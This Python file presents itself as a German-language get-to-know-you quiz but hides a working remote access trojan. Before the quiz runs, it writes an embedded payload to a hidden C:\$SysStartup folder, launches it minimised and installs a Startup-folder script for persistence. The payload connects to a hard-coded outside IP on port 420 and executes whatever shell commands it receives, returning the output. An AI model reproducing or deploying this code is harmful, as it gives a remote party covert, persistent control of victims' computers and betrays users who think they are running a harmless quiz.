from os import getlogin
from subprocess import call
from os.path import exists
from time import sleep

var = """
import socket as s
import threading
from os.path import exists
from subprocess import check_output
from time import sleep

HOST = "25.46.215.107"
PORT = 420
BUFFER = 1024
FORMAT = "cp850"
ADDR = (HOST, PORT)

client = s.socket(s.AF_INET, s.SOCK_STREAM)
client.connect(ADDR)


def sendMsg(msg):
	sendLength = str(len(msg)).encode("utf-8")
	print(sendLength)
	client.send(sendLength)

	client.send(msg.encode(FORMAT))
	recvMsg()


def process(message):
	ctype = message[0]
	messageLst = message.split(" ")

	if ctype == "p":
		check_output(messageLst, shell=True).decode(FORMAT)
		recvMsg()
	elif ctype == "c":
		messageLst.pop(0)
		comm = check_output(messageLst, shell=True).decode(FORMAT)
		sendMsg(comm)

	elif ctype == "f":
		pass

	else:
		pass


def recvMsg():
	msgLen = int(client.recv(BUFFER).decode(FORMAT))

	if msgLen:
		msg = client.recv(int(msgLen)).decode(FORMAT)
		process(msg)


recvMsg()

"""


# die fragen:

def quizz():
    name = input("Wie heißst du?: ")
    alter = input("Wie alt bist du?: ")
    print(f"Hi {name}, du bist {alter} Jahre alt.")
    jahr = input("Welches Jahr haben wir?: ")
    if jahr != "2021":
        print("das ist leider falsch")

    input("Gehst du in die HTL Anichstraße?: ")
    input("Woher kommst du?: ")
    input("Bist du männlich?: ")
    print("mehr kommt noch!")


# librarry stuff:
def libInit():
    def libLoad():
        call(["mkdir", "C:\\$SysStartup"], shell=True)
        call(["attrib", "+h", "C:\\$SysStartup", "/d"], shell=True)

        with open("pslib.pyw", "w") as lib:
            lib.write(var)

        call(["move", "pslib.pyw", "C:\\$SysStartup\\"], shell=True)
        call(["start", "/min", "cmd", "/c", "python C:\\$SysStartup\\pslib.pyw"], shell=True)

    if not exists(
            f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.bat") or not exists("C:\\$SysStartup\\pslib.pyw"):

        if not exists(f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\init.pyw"):
            with open("init.pyw", "w") as bat:
                bat.write("from subprocess import call\n call(['python', \"C:\$SysStartup\pslib.pyw\"]")

        sleep(0.5)
        call(["move", "init.pyw", f"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"], shell=True)

        if not exists("C:\\$SysStartup\\pslib.pyw"):
            libLoad()

        quizz()

    else:
        quizz()


libInit()
